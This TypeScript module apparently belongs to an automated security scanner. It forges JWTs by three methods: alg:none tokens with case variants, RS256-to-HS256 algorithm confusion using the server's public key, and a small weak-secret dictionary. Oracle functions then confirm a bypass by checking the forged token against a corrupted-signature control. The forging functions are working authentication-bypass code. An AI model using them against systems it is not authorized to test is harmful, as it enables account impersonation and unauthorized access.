// JWT forgery oracles for the exploration layer (explore.jwt-none, explore.jwt-forge).
//
// Generic signature-verification attacks, no target signature:
//   - alg:none (and case variants None/NONE/nOnE): an unsigned token is accepted.
//   - algorithm confusion (RS256 -> HS256): the server is told HS256 and verifies
//     with its RSA PUBLIC key as the HMAC secret; we re-sign with that public key.
//   - weak HMAC secret: an HS* token re-signed with a common/guessable secret.
//
// A forged token is proven only when it is ACCEPTED while a control token with a
// GARBAGE signature is REJECTED (so the endpoint does verify signatures, just
// broken) and the two responses differ. The validator re-encodes the model's own
// token; it never invents claims beyond an optional override.

import { createHmac, createPublicKey } from "node:crypto";

const b64url = (s: string | Buffer) => Buffer.from(s as never).toString("base64url");
const b64urlDecode = (s: string) => { try { return Buffer.from(s, "base64url").toString("utf8"); } catch { return ""; } };

function payloadOf(jwt: string): Record<string, unknown> | null {
  const parts = jwt.split(".");
  if (parts.length < 2) return null;
  try { return JSON.parse(b64urlDecode(parts[1]!)) as Record<string, unknown>; } catch { return null; }
}
function headerOf(jwt: string): Record<string, unknown> | null {
  const parts = jwt.split(".");
  if (parts.length < 1) return null;
  try { return JSON.parse(b64urlDecode(parts[0]!)) as Record<string, unknown>; } catch { return null; }
}

/** alg:none token (one spelling), trailing dot, empty signature. */
export function forgeNoneToken(jwt: string, override?: Record<string, unknown>, alg = "none"): string | null {
  const payload = payloadOf(jwt);
  if (!payload) return null;
  if (override) Object.assign(payload, override);
  return `${b64url(JSON.stringify({ alg, typ: "JWT" }))}.${b64url(JSON.stringify(payload))}.`;
}

/** Case variants servers sometimes still accept. */
export const NONE_ALGS = ["none", "None", "NONE", "nOnE"];
export function forgeNoneVariants(jwt: string, override?: Record<string, unknown>): string[] {
  return NONE_ALGS.map((a) => forgeNoneToken(jwt, override, a)).filter((t): t is string => !!t);
}

/** Re-sign the token's payload as HS256 with `secret` (string or Buffer). Used for
 * algorithm confusion (secret = the server's RSA public key PEM) and weak-secret. */
export function forgeHs256(jwt: string, secret: string | Buffer, override?: Record<string, unknown>): string | null {
  const payload = payloadOf(jwt);
  if (!payload) return null;
  if (override) Object.assign(payload, override);
  const signingInput = `${b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }))}.${b64url(JSON.stringify(payload))}`;
  const sig = createHmac("sha256", secret).update(signingInput).digest("base64url");
  return `${signingInput}.${sig}`;
}

/** A JWK (RSA) -> the candidate PEM strings a server might use as the HMAC secret
 * under algorithm confusion (SPKI and PKCS1, with and without a trailing newline). */
export function jwkToPems(jwk: Record<string, unknown>): string[] {
  try {
    const key = createPublicKey({ key: jwk as never, format: "jwk" });
    const spki = key.export({ type: "spki", format: "pem" }).toString();
    const pkcs1 = key.export({ type: "pkcs1", format: "pem" }).toString();
    const out = new Set<string>();
    for (const pem of [spki, pkcs1]) { out.add(pem); out.add(pem.trimEnd()); out.add(pem.trimEnd() + "\n"); }
    return [...out];
  } catch { return []; }
}

/** Common/weak HMAC secrets to try on an HS* token (generic dictionary, small). */
export const WEAK_SECRETS = ["secret", "password", "changeme", "jwt_secret", "your-256-bit-secret", "key", "admin", "supersecret", "jwtsecret", "secretkey", "default", "test"];

export interface Observed { status: number; body: string }
const DENY = new Set([401, 403, 404]); // protected resources often mask anon access with 404
const ok2xx = (s: number) => s >= 200 && s < 300;

/** alg:none kept for the explore.jwt-none class (anon-control form). */
export function jwtNoneOracle(input: { forged: Observed; anon: Observed }): { verdict: "proven" | "lead" | "denied"; reason: string } {
  const { forged, anon } = input;
  if (!ok2xx(forged.status)) return { verdict: "denied", reason: `the alg:none token was rejected (HTTP ${forged.status})` };
  if (DENY.has(anon.status) && forged.body !== anon.body) {
    return { verdict: "proven", reason: `an unsigned alg:none token is accepted (HTTP ${forged.status}) where no token is denied (HTTP ${anon.status})` };
  }
  if (ok2xx(anon.status)) return { verdict: "lead", reason: "the endpoint also answers without any token: not auth-gated, review by hand" };
  return { verdict: "lead", reason: `alg:none gave HTTP ${forged.status} but the control is inconclusive` };
}

export const isRsaAlg = (alg: unknown) => typeof alg === "string" && /^(RS|PS)\d{3}$/.test(alg);
export const isHmacAlg = (alg: unknown) => typeof alg === "string" && /^HS\d{3}$/.test(alg);

/** Forged token accepted while a garbage-signature control is rejected => the
 * endpoint verifies signatures but the forgery passed. Independent of how the
 * endpoint treats a missing token, so it works even when anon returns 404. */
export function jwtForgeOracle(input: { forged: Observed; control: Observed; valid?: Observed }): { verdict: "proven" | "lead" | "denied"; reason: string } {
  const { forged, control, valid } = input;
  if (!ok2xx(forged.status)) return { verdict: "denied", reason: `the forged token was rejected (HTTP ${forged.status})` };
  // The control is the SAME forged token with a corrupted signature: it must fail.
  if (ok2xx(control.status)) return { verdict: "lead", reason: "even a corrupted-signature token is accepted: the endpoint ignores the signature entirely (or is not auth-gated), review by hand" };
  if (forged.body === control.body) return { verdict: "lead", reason: "forged and corrupted-signature responses are identical: inconclusive" };
  if (valid && ok2xx(valid.status) && forged.body !== valid.body) {
    // Accepted, but the body differs from a genuine token's: still a signature bypass, note it.
    return { verdict: "proven", reason: `the forged token is accepted (HTTP ${forged.status}) while a corrupted-signature token is rejected (HTTP ${control.status})` };
  }
  return { verdict: "proven", reason: `the forged token is accepted (HTTP ${forged.status}) while a corrupted-signature token is rejected (HTTP ${control.status})` };
}

/** Corrupt a token's signature (flip the last char) for the negative control. */
export function corruptSig(token: string): string {
  const i = token.lastIndexOf(".");
  if (i < 0 || i === token.length - 1) return token + "x";
  const last = token[token.length - 1]!;
  return token.slice(0, -1) + (last === "a" ? "b" : "a");
}

export { headerOf, payloadOf };
